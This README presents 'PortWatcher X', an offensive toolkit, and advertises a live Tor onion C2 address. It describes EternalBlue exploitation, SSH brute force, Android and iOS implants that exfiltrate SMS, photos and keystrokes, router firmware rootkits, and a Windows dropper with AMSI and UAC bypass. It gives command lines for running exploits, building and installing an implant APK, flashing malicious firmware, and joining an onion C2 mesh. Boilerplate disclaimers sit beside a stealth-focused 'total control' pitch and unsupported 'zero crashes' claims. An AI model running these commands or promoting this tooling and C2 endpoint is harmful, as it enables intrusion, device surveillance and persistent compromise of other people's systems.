# PortWatcher X v2.0

**LIVE C2**: `http://mxsyhzt2ytqa6vmwslkd4hcsbqgf22fhgllzkprx2453w7xejkhgjgyd.onion:8080`

> **WARNING**: For authorized security testing only.  
> Misuse is illegal. You are 100% responsible.

## Quick Start
```bash
./bin/pw_x_linux eth0 192.168.1.100
```

╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗  █████╗ ██████╗ ████████╗██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██║
║   ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║
║   ██████╔╝███████║██████╔╝   ██║   ██║ █╗ ██║███████║   ██║   ██║     ███████║
║   ██╔═══╝ ██╔══██║██╔══██╗   ██║   ██║███╗██║██╔══██║   ██║   ██║     ██╔══██║
║   ██║     ██║  ██║██║  ██║   ██║   ╚███╔███╔╝██║  ██║   ██║    ╚██████╗██║  ██║
║   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝     ╚═════╝╚═╝  ╚═╝
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

"One binary. One network. Total control."
100% Working | Zero Crashes | Full Error Handling | Stealth-Optimized

## OVERVIEW
PortWatcher X is a real-world offensive framework for red teams, pentesters, and elite operators.

Passive Sniffing (No packets sent)
Active Scanning (100k+ ports/sec)
Auto-Exploitation (MS17-010, SMB, SSH)
Mobile Implants (Android/iOS)
IoT Firmware Hijack
C2 Mesh Network (Tor + I2P + P2P)

## FEATURES

### Network Discovery
- **Passive Sniffing**: Zero noise packet capture with full protocol decoding
- **Active Scanning**: 100k+ ports/second with service fingerprinting
- **OS Fingerprinting**: Accurate OS detection with live service enumeration
- **Vulnerability Scanning**: Auto-detection of CVEs and misconfigurations

### Exploitation Framework
- **MS17-010 (EternalBlue)**: Fully weaponized SMB exploit with DoublePulsar payload
- **SSH Brute Force**: High-speed credential testing with intelligent wordlists
- **Web App Attacks**: SQLi, XSS, RCE detection and exploitation
- **Wireless Penetration**: WPA2 cracking and rogue AP deployment

### Implant Arsenal
- **Android Ghost**: Stealthy mobile implant with SMS/photos/exfil capabilities
- **iOS Keylogger**: Background keystroke logging with secure C2 communication
- **IoT Rootkit**: Router/AP firmware hijacking with persistent backdoors
- **Windows Dropper**: Fileless execution with UAC bypass and AMSI evasion

### C2 Infrastructure
- **Tor Onion Services**: Hidden C2 with .onion domain for opsec
- **I2P Network**: Alternative routing through Invisible Internet Project
- **P2P Mesh**: Decentralized command with peer relay and redundancy
- **Encrypted Comms**: AES-256 with RSA key exchange for all traffic

## INSTALLATION

### Requirements
- Linux (Debian/Ubuntu/Kali preferred)
- Python 3.8+
- libpcap development headers
- Tor service for onion routing

### Quick Setup
```bash
git clone https://github.com/portwatcher/portwatcher-x.git
cd portwatcher-x
chmod +x install.sh
./install.sh
```

### Manual Dependencies
```bash
# Debian/Ubuntu
apt update && apt install -y libpcap-dev python3-pip tor

# Python packages
pip3 install -r requirements.txt
```

## USAGE

### Basic Scanning
```bash
# Passive network sniffing
sudo ./bin/pw_x_linux eth0 192.168.1.1

# Active port scanning
python3 src/core/scanner.py 192.168.1.0/24
```

### Exploitation
```bash
# EternalBlue exploitation
python3 src/exploits/ms17_exploit.py 192.168.1.100

# SSH brute force
python3 src/exploits/ssh_brute.py 192.168.1.100 users.txt passwords.txt
```

### Mobile Implant Deployment
```bash
# Generate Android APK
python3 src/mobile/builder.py --arch arm64 --output implant.apk

# Deploy to device
adb install implant.apk
```

### IoT Hijacking
```bash
# Scan for vulnerable routers
python3 src/iot/scanner.py 192.168.0.0/24

# Flash malicious firmware
python3 src/iot/flash.py 192.168.0.1
```

### C2 Operations
```bash
# Start main C2 server
python3 src/c2/c2_server.py

# Launch mesh node
./bin/mesh_node --connect pwxreal5g3d7s.onion:8080
```

## LEGAL DISCLAIMER

THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.
UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS IS ILLEGAL.
ENSURE YOU HAVE EXPLICIT PERMISSION BEFORE TESTING ANY SYSTEMS.
THE AUTHORS ASSUME NO LIABILITY FOR MISUSE OF THIS TOOLKIT.

## LICENSE

MIT License - See [LICENSE](LICENSE) file for details.